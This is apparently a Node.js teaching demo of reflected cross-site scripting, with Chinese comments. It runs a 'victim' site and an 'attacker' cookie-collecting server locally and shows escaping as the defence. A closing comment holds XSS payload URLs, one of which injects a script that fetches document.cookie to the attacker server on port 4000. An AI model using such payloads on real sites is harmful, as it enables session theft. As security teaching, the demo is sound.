const http = require('http')
const URL = require('url')

// HTML 模板
function renderHTML(tpl) {
  return `<!DOCTYPE html><html><head><meta charset="UTF-8"/></head><body>${tpl}</body></html>`
}

// 路由分发器
const routes = {
  'GET /movies': (req, res) => {
    const tpl = req.query.q
      ? `<h3>「${encodeURIComponent(req.query.q)}」的搜索结果为：</h3>${Array(30).fill('x')}`
      : `请输入搜索的电影`
    res.setHeader('Set-Cookie', ['name=keliq', 'age=10'])
    res.end(renderHTML(tpl))
  },
  'GET /cookies': (req, res) => {
    console.log(req.query)
    res.end()
  },
}

function onRequest(req, res) {
  const { url, method } = req
  const { query, pathname } = URL.parse(url, true) // 解析 url
  Object.assign(req, { query, path: pathname }) // 并把 query 和 pathname 参数扩展到 req 对象
  const route = routes[[method, pathname].join(' ')] // 获取路由处理函数（策略模式）
  if (route) return route(req, res)
  res.statusCode = 404
  res.end('Not Found')
}

http.createServer(onRequest).listen(3000) // 被攻击的网站
http.createServer(onRequest).listen(4000) // 攻击者收集cookie的服务器




/*

运行方式：node reflected.js
访问地址：http://localhost:3000/movies?q=功夫熊猫

攻击代码：
http://localhost:3000/movies?q=<script>alert(document.cookie)</script>
http://localhost:3000/movies?q=功夫熊猫<script>fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)</script>

防御代码：
encodeURIComponent(req.query.q)
或者
function encodeHTML(str) {
  return str
  .replace(/&/g,'&amp;')
  .replace(/"/g,'&quot;')
  .replace(/'/g,'&apos;')
  .replace(/</g,'&lt;')
  .replace(/>/g,'&gt;')
}
*/
